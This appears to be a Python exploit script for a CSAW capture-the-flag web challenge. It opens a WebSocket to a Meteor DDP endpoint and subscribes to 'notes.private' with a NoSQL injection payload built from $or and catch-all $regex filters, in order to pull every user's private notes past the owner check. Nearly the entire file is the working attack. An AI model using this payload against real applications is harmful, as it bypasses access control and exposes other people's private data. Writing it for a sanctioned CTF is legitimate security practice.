import websocket
import json

def send_message(ws, msg):
    ws.send(json.dumps(msg))

def on_message(ws, message):
    print(f"Received: {message}")

def on_error(ws, error):
    print(f"Error: {error}")

def on_close(ws):
    print("Connection closed")

def on_open(ws):
    # Connect message
    connect_msg = {
        "msg": "connect",
        "version": "1",
        "support": ["1"]
    }
    send_message(ws, connect_msg)

    # Try to subscribe to notes.private with NoSQL injection
    subscribe_msg = {
        "msg": "sub",
        "id": "1",
        "name": "notes.private",
        "params": [{
            "$or": [
                {"owner": {"$regex": ".*"}},
                {"username": {"$regex": ".*"}}
            ]
        }]
    }
    send_message(ws, subscribe_msg)

# Connect to the WebSocket
ws = websocket.WebSocketApp(
    "ws://web.chal.csaw.io:5000/websocket",
    on_message=on_message,
    on_error=on_error,
    on_close=on_close,
    on_open=on_open
)

ws.run_forever()

